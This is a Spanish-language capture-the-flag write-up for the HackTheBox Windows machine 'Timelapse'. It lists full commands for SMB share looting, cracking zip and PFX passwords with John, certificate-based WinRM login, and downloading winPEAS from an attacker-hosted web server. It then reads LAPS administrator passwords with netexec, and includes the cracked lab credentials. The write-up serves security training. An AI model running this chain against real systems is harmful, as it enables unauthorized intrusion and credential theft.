+++ 
draft = false
date = 2026-01-14T21:05:56Z
title = "Timelapse Machine - HackTheBox"
description = "Esta es una máquina Windows de nivel fácil de la plataforma HackTheBox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Machine #Windows #Easy #LAPS 
----------------

# Introducción

Esta es una máquina Windows que expone un recurso compartido mediante el protocolo **SMB**, el cual contiene un archivo comprimido protegido por contraseña. Para obtener su contenido, es necesario romper dicha contraseña utilizando la herramienta **John the Ripper**.

Al extraer el archivo comprimido, se obtiene un archivo **PFX** que también se encuentra protegido mediante contraseña. Este archivo puede convertirse a un formato de hash compatible con John, permitiendo nuevamente la recuperación de su contraseña.

A partir del archivo PFX es posible extraer un **certificado SSL** junto con su **clave privada**, los cuales son utilizados para autenticarse en el sistema a través del servicio **WinRM**, empleando autenticación basada en certificados en lugar de credenciales tradicionales.

En cuanto a la escalada de privilegios, inicialmente se realiza movimiento lateral a partir de un archivo almacenado que contiene credenciales en texto plano. Con el usuario obtenido, se observa que este pertenece a un grupo con permisos sobre **LAPS**.

**LAPS (Local Administrator Password Solution)** es un mecanismo que permite gestionar y almacenar de forma centralizada la contraseña del administrador local de los equipos. El grupo **LAPS_Readers** otorga permisos para leer estas credenciales, lo que representa un riesgo crítico de seguridad, ya que permite obtener la contraseña del administrador local y, con ello, escalar privilegios en el sistema.

# Enumeración de puertos

Partimos realizando un escaneo de los puertos abiertos de la máquina víctima de la siguiente forma.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.152 -oG allPorts
```

y posteriormente realizar un escaneo de servicios y versiones de la siguiente manera.

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695,56528 -sCV 10.10.11.152 -oN portServices
```

Teniendo los siguiente resultados

<img src="/images/Pasted image 20260114141902.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración SMB

Como vimos en el escaneo de puertos, y en el de servicios. Tenemos el puerto `445`abierto. Primeramente nos aprovecharemos del puerto para con `netexec` encontrar el nombre de dominio y el nombre de la máquina víctima

```bash
netexec smb 10.10.11.152
```

<img src="/images/Pasted image 20260114142532.png" style="width:100%; height:auto; display:block; margin:auto;">

Teniendo como resultado `DC0` y `timelapse.htb`, por tanto lo agregamos a nuestro `/etc/hosts`

<img src="/images/Pasted image 20260114142558.png" style="width:100%; height:auto; display:block; margin:auto;">

Como no tenemos credenciales válidas, realizaremos enumeración de recursos compartidos como el usuario `guest`

```bash
netexec smb 10.10.11.152 -u 'guest' -p '' --shares
```

Encontrando que el recurso `Shares` tiene permisos de lectura

<img src="/images/Pasted image 20260114142823.png" style="width:100%; height:auto; display:block; margin:auto;">

Crearemos una carpeta con el mismo nombre que el recurso compartido, y posteriormente nos conectaremos al recurso y descargaremos todo a nuestra máquina local

```bash
mkdir Shares
cd Shares
smbclient //10.10.11.152/Shares -U 'guest'
```

<img src="/images/Pasted image 20260114143020.png" style="width:100%; height:auto; display:block; margin:auto;">

Y ahora realizamos los siguientes comandos para descargar todos los archivos compartidos

```bash
mask ""
prompt off
recurse on
mget *
```

<img src="/images/Pasted image 20260114143142.png" style="width:100%; height:auto; display:block; margin:auto;">

Si hacemos un `tree` en nuestra máquina local para ver la estructura de los archivos descargados, tenemos lo siguiente

<img src="/images/Pasted image 20260114143219.png" style="width:100%; height:auto; display:block; margin:auto;">

# Bruteforce zip

Encontramos un archivo interesante, `winrm_backup.zip`, el cual contiene un archivo `PFX`. Al intentar extraerlo nos solicita contraseña, la cual no la tenemos.

<img src="/images/Pasted image 20260114143408.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto realizaremos un ataque de fuerza bruta, para obtener la contraseña del archivo zip, para ello primero debemos obtener un hash a crackear

Para obtener el hash que crackeará `john`, hacemos el siguiente comando

```bash
zip2john winrm_backup.zip > zip.hash
```

Teniendo el archivo `zip.hash`, ahora podemos utilizar `john`

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

y encontramos la contraseña `supremelegacy`

<img src="/images/Pasted image 20260114144407.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto ahora podemos extraer el archivo `.zip`

```bash
unzip winrm_backup.zip
```

Obteniendo el archivo `legacyy_dev_auth.pfx`.

Los archivos `.pfx` funcionan como un contenedor seguro y cifrado que almacena certificados digitales junto con sus claves privadas y públicas.  
Estos archivos requieren una contraseña válida para poder acceder a su contenido.

<img src="/images/Pasted image 20260114144608.png" style="width:100%; height:auto; display:block; margin:auto;">

Verificamos si el archivo necesita contraseña

```bash
openssl pkcs12 -info -in legacyy_dev_auth.pfx
```

y si nos pide, como no tenemos la contraseña, y la obtenida anterior no funciona.

# Bruteforce PFX

Haremos fuerza bruta a `pfx`, para ellos necesitamos un hash.

Para obtener el hash podemos utilizar `pfx2john`

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
```

Para extraerlo lo haremos de la forma común

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
```

Obteniendo la contraseña `thuglegacy`, por tanto ahora podemos acceder a los certificados

<img src="/images/Pasted image 20260114150646.png" style="width:100%; height:auto; display:block; margin:auto;">

# Certificados vía PFX

Para extraer los certificados tenemos los dos siguientes comandos

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
```

Obtenemos exitosamente ambos archivos

<img src="/images/Pasted image 20260114150959.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora con ellos podemos acceder a la máquina víctima mediante `Win-RM`

# Acceso máquina víctima vía WinRM

Para acceder a la máquina víctima con los certificados obtenidos podemos utilizar `evil-winrm` de la siguiente forma

```bash
evil-winrm -k key.pem -c cert.pem -i 10.10.11.152 -S
```

Obteniendo acceso a la máquina víctima como el usuario `legacyy`

<img src="/images/Pasted image 20260114151255.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento lateral

Viendo los privilegios de nuestro usuario no encontramos nada interesante para escalar privilegios, por tanto utilizaremos la herramienta `Winpeas` para buscar formas de escalar privilegios en windows, del siguiente link de github `https://github.com/peass-ng/PEASS-ng/releases/tag/20251101-a416400b`

Mediante el escaneo inicial, sabemos que la máquina víctima tiene arquitectura x64.
Por tanto descargaremos `winPEASx64.exe`

Primero crearemos el directorio `C:\\temp\`

<img src="/images/Pasted image 20260114152045.png" style="width:100%; height:auto; display:block; margin:auto;">

Para descargar el archivo, lo vamos a compartir mediante un servidor web con python, pero primeramente le cambiaremos el nombre a `winpeas.exe`

```bash
python3 -m http.server 80
```

y desde `evil-winrm` haremos el siguiente comando para descargar el `winpeas.exe`

```bash
Invoke-WebRequest http://10.10.14.20/winpeas.exe -OutFile C:\temp\winpeas.exe
```

Vemos que se descargó correctamente

<img src="/images/Pasted image 20260114152824.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora solo corremos el `winpeas` de la siguiente forma

```bash
.\winpeas.exe
```

Encontramos el archivo que contiene el historial de powershell, el cual está en 
`C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, este archivo puede contener credenciales en texto plano, si es que el administrador no limpia el historial de comandos utilizados.

<img src="/images/Pasted image 20260114154551.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto le haremos un `type` y encontramos las siguientes credenciales:
`svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV`

<img src="/images/Pasted image 20260114171828.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto nos conectamos mediante `evil-winrm` con las credenciales obtenidas

```bash
evil-winrm -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152 -S
```

<img src="/images/Pasted image 20260114171957.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Con el nuevo usuario vemos a qué grupos pertenece, para encontrar algún método de escalada de privilegios

```bash
net user svc_deploy
```

<img src="/images/Pasted image 20260114172401.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que tenemos el permiso `LAPS_Readers`, el cual permite manipular las contraseñas en LAPS, además de ver las contraseñas almacenadas.

# ReadLAPS Passwords

Para más información tenemos la siguiente página https://www.thehacker.recipes/ad/movement/dacl/readlapspassword

Para obtener las contraseñas de LAPS podemos hacer el siguiente comando

```bash
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps
```

En nuestro caso sería

```bash
nxc ldap 10.10.11.152 -d timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --module laps
```

Vemos que encontramos la siguiente contraseña: `N#34}z/e7!9kOL3Y]1b{gwQE`

<img src="/images/Pasted image 20260114173003.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora nos podemos conectar con `evil-winrm` proporcionando la contraseña obtenida y el usuario `administrator`

```bash
evil-winrm -u 'administrator' -p 'N#34}z/e7!9kOL3Y]1b{gwQE' -i 10.10.11.152 -S
```

y obtenemos acceso de `Administrator`

<img src="/images/Pasted image 20260114173123.png" style="width:100%; height:auto; display:block; margin:auto;">

# FLAGS

Para obtener la flag de `user.txt`, podemos hacer el siguiente comando

```bash
Get-ChildItem -Path C:\Users\ -Recurse -Filter user.txt -ErrorAction SilentlyContinue
```

<img src="/images/Pasted image 20260114173421.png" style="width:100%; height:auto; display:block; margin:auto;">

Para la flag de `root.txt`, hacemos lo siguiente

```bash
Get-ChildItem -Path C:\Users\ -Recurse -Filter root.txt -ErrorAction SilentlyContinue
```

<img src="/images/Pasted image 20260114173526.png" style="width:100%; height:auto; display:block; margin:auto;">
